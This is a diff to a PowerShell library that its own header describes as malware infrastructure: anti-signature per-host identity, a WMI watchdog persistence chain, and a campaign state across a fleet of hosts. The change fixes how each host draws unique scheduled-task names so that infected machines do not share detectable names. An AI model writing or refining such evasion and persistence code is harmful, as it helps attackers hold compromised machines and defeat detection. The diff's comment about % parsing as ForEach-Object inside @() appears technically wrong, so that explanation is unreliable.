@@ -1,6 +1,6 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L5
+# OWN_LIB  BUILD 20260802L6
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
 # L2: safe task-name pools (parents exist on all Win10/11), IDENTVER
@@ -77,12 +77,23 @@ function Initialize-Identity {
     # L4: two slots may hash to the same task path (pools share names) ->
     # one physical task then satisfies two slots and the fleet shows 3/4.
     # Walk each pool forward until the pick is unique across slots.
+    # L6: the old @(@('A', $s % 8), ...) form was double-broken in PS 5.1:
+    # bare % inside @() parses as the ForEach-Object alias (not modulo), so the
+    # collection collapsed and the loop never ran -> identity.cfg had EMPTY
+    # TASK_* and the whole fleet fell back to identical default task names.
+    $seeds = [ordered]@{
+        A = ($s % 8)
+        B = (($s + 3) % 8)
+        C = (($s + 5) % 8)
+        D = (($s + 7) % 8)
+    }
     $pick = [ordered]@{}
-    foreach ($slot in @(@('A', $s % 8), @('B', ($s + 3) % 8), @('C', ($s + 5) % 8), @('D', ($s + 7) % 8))) {
-        $letter = [string]$slot[0]; $i = [int]$slot[1]
+    foreach ($letter in 'A','B','C','D') {
+        $i = [int]$seeds[$letter]
         $name = $Pools[$letter][$i]
         $n = 0
         while ($pick.Values -contains $name -and $n -lt 8) { $i = ($i + 1) % 8; $name = $Pools[$letter][$i]; $n++ }
+        if (-not $name) { $name = $Defaults["TASK_$letter"] }
         $pick[$letter] = $name
     }
     $cfg = @(
